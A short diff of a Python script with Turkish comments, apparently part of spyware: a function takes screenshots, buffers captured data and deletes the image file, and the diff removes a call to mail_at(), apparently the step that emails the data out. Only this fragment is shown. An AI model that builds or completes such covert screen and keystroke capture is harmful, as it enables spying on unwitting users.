@@ -56,7 +56,6 @@ def ss_bekle():
             ss=ImageGrab.grab()
             ss.save("Data\\ScreenShot.png","JPEG")#dosya ismi isteğe bağlı uzantısıyla hariç değiştirilebilir
             temp=data
-            mail_at()
             data=""
             os.remove("Data\\ScreenShot.png")#dosya ismi isteğe bağlı uzantısıyla hariç değiştirilebilir
             continue
